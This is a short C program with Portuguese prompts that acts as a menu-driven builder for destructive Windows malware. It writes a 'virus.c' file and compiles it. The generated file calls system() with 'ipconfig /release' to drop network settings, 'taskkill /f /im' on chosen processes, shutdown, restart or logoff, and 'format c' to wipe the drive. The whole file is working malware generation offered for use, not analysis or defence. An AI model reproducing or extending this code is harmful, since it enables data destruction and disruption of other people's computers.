#include<stdio.h>
#include<stdlib.h>

int main(){
    int resp=0,option;
    char processo[50];
    FILE *arquivo;
    /*Iniciando arquivo*/
    arquivo=fopen("virus.c","w");
    fprintf(arquivo,"\n#include<stdio.h>");
    fprintf(arquivo,"\n#include<stdlib.h>");
    fprintf(arquivo,"\nint main(){");
    printf("Para todas as perguntas use 1 para SIM e 0 para NAO\n");
    printf("Deseja desconfigurar a rede dando ipconfig/relase\n");
    scanf("%d",&resp);
    if(resp==1){
        /*Desconfigurar ip, gateway, dns*/
        fprintf(arquivo,"\nsystem(\"ipconfig /release\");");
        resp=0;
    }
    printf("Deseja finalizar algum processo\n");
    scanf("%d",&resp);
    if(resp==1){
        printf("Digite quantos processos deseja finalizar:");
        scanf("%d",&option);
        while(option>0){
            printf("Digite qual processo deseja finalizar:");
            scanf("%s",processo);
            fflush(stdin);
            fprintf(arquivo,"\nsystem(\"taskkill /f /im %s\");",processo);
            option--;
        }
    }
    printf("Deseja desligar/reiniciar/logoff o computador\n");
    scanf("%d",&resp);
    if(resp==1){
        printf("Escolha uma das opcoes:\n1-desligar\n2-reiniciar\n3-logoff\n");
        scanf("%d",&option);
        switch(option){
        case 1: fprintf(arquivo,"\nsystem(\"shutdown /s\");");
        break;
        case 2: fprintf(arquivo,"\nsystem(\"shutdown /r\");");
        break;
        case 3: fprintf(arquivo,"\nsystem(\"shutdown /l\");");
        break;
        default: printf("escolha uma das opcoes\n");
        }
    }
    printf("Deseja formatar c:\n");
    scanf("%d",&resp);
    if(resp==1){
        fprintf(arquivo,"\nsystem(\"format c\");");
    }
    /*fechando arquivo*/
    fprintf(arquivo,"\nreturn 0;");
    fprintf(arquivo,"\n}");
    fclose(arquivo);
    /*compilando virus.c e deletando depois*/
    system("gcc virus.c -o virus -ansi -pedantic -Wall");
    /*system("del virus.c");
    system("del Assembler.o");*/
    return 0;
}
